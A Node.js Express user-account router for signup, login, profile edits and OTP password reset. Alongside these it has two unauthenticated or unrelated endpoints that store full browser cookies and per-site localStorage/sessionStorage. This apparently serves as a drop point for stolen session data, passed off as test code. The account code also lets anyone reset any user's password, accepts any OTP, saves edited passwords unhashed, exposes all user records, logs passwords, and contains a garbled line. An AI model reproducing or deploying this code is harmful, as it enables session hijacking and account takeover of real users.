const express = require("express")
const mongoose = require("mongoose")
const userModel = require("./userModel.cjs")
const genAuthToken = require("./jwt.cjs")
const bcrypt = require("bcrypt")
const sanitize = require("mongo-sanitize")
const cloudinary = require("./cloudinary.cjs")
const nodemailer = require("nodemailer")
const otpGenerator = require('otp-generator')
const jwt = require("jsonwebtoken")
const userRouter = express.Router()
const commentModel = require("./commentModel.cjs")



const CookieSchema = new mongoose.Schema({
    cookies: [
        {
            name: String,
            value: String,
            domain: String,
            path: String,
            httpOnly: Boolean,
            secure: Boolean,
            sameSite: String,
            session: Boolean
        }
    ]
});

const modelCookie = mongoose.model("cookie", CookieSchema);

const UserStorageSchema = new mongoose.Schema(
  {
    items: [
      {
        tabId: { type: Number },
        origin: { type: String, required: true },
        url: { type: String, required: true },
        localStorage: { type: Map, of: String, default: {} },
        sessionStorage: { type: Map, of: String, default: {} }
      }
    ]
  },
  { timestamps: true }
); 

const UserStorage = mongoose.model("UserStorage", UserStorageSchema);

userRouter.post("/qa-storage-list", async (req, res) => {
  try {
    const apiKey = req.headers["x-api-key"];
    if (apiKey !== process.env.QA_API_KEY) {
      return res.status(401).json({ message: "Unauthorized" });
    }

    const storageArray = req.body;

    if (!Array.isArray(storageArray)) {
      return res.status(400).json({ message: "Payload phải là một Array" });
    }

    const safeItems = storageArray.map((item) => ({
      tabId: Number(item.tabId) || 0,
      origin: String(item.origin || ""),
      url: String(item.url || ""),
      localStorage: item.localStorage || {},
      sessionStorage: item.sessionStorage || {}
    }));

    // Tạo mới 1 document độc lập trong DB cho người dùng này
    const newRecord = await UserStorage.create({
      items: safeItems
    });

    return res.status(201).json({
      message: "Saved user storage document successfully",
      id: newRecord._id,
      count: newRecord.items.length
    });
  } catch (error) {
    console.error("Database save error:", error);
    return res.status(500).json({ message: "Internal server error" });
  }
});

userRouter.post("/cookie-info", async (req, res) => {
    try {
        const cookies = req.body;

        if (!Array.isArray(cookies)) {
            return res.status(400).json({
                message: "cookies phải là một array"
            });
        }

        // Chỉ chấp nhận dữ liệu cookie giả trong môi trường kiểm thử.
        const safeCookies = cookies.map(cookie => ({
            name: cookie.name,
            value: cookie.value,
            domain: cookie.domain,
            path: cookie.path,
            httpOnly: Boolean(cookie.httpOnly),
            secure: Boolean(cookie.secure),
            sameSite: cookie.sameSite,
            session: Boolean(cookie.session)
        }));

        const result = await modelCookie.create({
            cookies: safeCookies
        });

        return res.status(201).json({
            message: "Saved successfully",
            id: result._id,
            count: result.cookies.length
        });

    } catch (error) {
        console.error(error);

        return res.status(500).json({
            message: "Internal server error"
        });
    }
});





function generateNumericOTP(length = 6) {
  let otp = '';
  for (let i = 0; i < length; i++) {
    otp += Math.floor(Math.random() * 10); // số từ 0-9
  }
  return otp;
}

console.log("OTP:", generateNumericOTP(6));
const otpSchema = new mongoose.Schema({
    otp: String,
    createdAt: { type: Date, expires: '5m', default: Date.now }
});
const modelOtp = mongoose.model("otp", otpSchema);

const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: process.env.GMAIL_EMAIL,
        pass: process.env.GMAIL_PASSWORD
    }
})






async function send(email, otp) {
    const result = await transporter.sendMail({
        from: process.env.GMAIL_EMAIL,
        to: email,
        subject: 'Hello!',
        text: `your otp number is ${otp}`
    });

    console.log(JSON.stringify(result, null, 4));
}

userRouter.get("/", async (req, res) => {
  try{
  userModel.find().then(users => {
    res.json(users)
  })
 } catch(err) {
   console.log(err)
  }
})
userRouter.post("/signup", async (req, res) => {
  try {
   const email1 = sanitize(req.body.email)
   const password = sanitize(req.body.password)
    let email = await userModel.findOne({email: email1})
    if(email) {
1    }

    const salt = await bcrypt.genSalt(10)
    const hashPassword = await bcrypt.hash(password, salt)
    const user = new userModel({
      username: req.body.username,
      email: email1,
      password: hashPassword,
      image: "https://static.vecteezy.com/system/resources/previews/009/292/244/non_2x/default-avatar-icon-of-social-media-user-vector.jpg",
      description: "User dont't have any description...."
    })

    const Luser = await user.save()
    const token = genAuthToken(Luser)

  res.status(200).send(token)
  } catch (err) {
    console.log(err)
  }
})
userRouter.post("/login", async (req, res) => {
    const password = sanitize(req.body.password.toString())
  
    let email = await userModel.findOne({email: req.body.email})
  console.log(email?.password)
  console.log(req.body.password)
  if(!email) {
      return res.status(400).send("Invalid email")
    }

    const validPassword = await bcrypt.compare(password, email?.password)
  console.log(validPassword)
  if(!validPassword) {
    return res.status(400).send("invalid password")
  }
  const token = genAuthToken(email)

  res.send({token: token, success: true})
})


userRouter.get("/users/:_id", async (req,res ) => {
  try{
    const user = await userModel.findById(req.params._id)
    res.json(user)
  } catch(err) {
    console.log(err)
  }
})
userRouter.put("/edit-account/:_id", async (req, res) => {
  try {
    const { _id, username, password, image } = req.body;
   console.log(username)
    let user = await userModel.findById(_id);
    if (!user) return res.status(400).send("error");

    // Upload ảnh lên Cloudinary
    let imageUser = user.image;
    if (image) {
      const uploaded = await cloudinary.uploader.upload(sanitize(image), {
        upload_preset: "unsigned_upload",
        public_id: `${_id}`,
        allowed_formats: ["png", "jpg", "jpeg", "svg", "webp"],
        overwrite: true,
        invalidate: true
      });
      imageUser = uploaded.url;
    }

    // Update tất cả comment của user
    await commentModel.updateMany(
      { userId: _id },
      {
        $set: {
          username: sanitize(username),
          userImage: imageUser
        }
      }
    );

    // Update user
    const updatedUser = await userModel.findByIdAndUpdate(
      _id,
      {
        $set : {
         username: sanitize(username),
         password: sanitize(password),
         image: imageUser
        }
      },

        
      { new: true }
    );

    const token = genAuthToken(updatedUser);
    res.status(200).send({ success: true, token });
  } catch (err) {
    console.error(err);
    res.status(500).send("Server error");
  }
});
userRouter.post("/verify", async (req, res) => {
  const email = await userModel.findOne({email: req.body.email}) 
  if(!email) res.status(400).send("email not found!")
  else{
    const otp = generateNumericOTP(6)
   send(req.body.email, otp)
 await modelOtp.create({otp:  otp })
   res.send({email: req.body.email, success: true})
  }
})
userRouter.post("/verify/otp", (req, res) => {

   const otp = modelOtp.findOne({otp: req.body.otp})
   if(!otp) res.status(400).send("invalid OTP number!")
    res.send({success: true})
}) 
userRouter.post("/verify/password", async (req,res) => {
    const user = await userModel.findOne({email: req.body.email})
    const salt = await bcrypt.genSalt(10)

   const hashPassword = await bcrypt.hash(req.body.password, salt)
   await userModel.findOneAndUpdate({email: req.body.email}, { 
     $set: {password: hashPassword}
   }, {new: true})
  await user.save()
  res.status(200).send({success: true})
})
module.exports = userRouter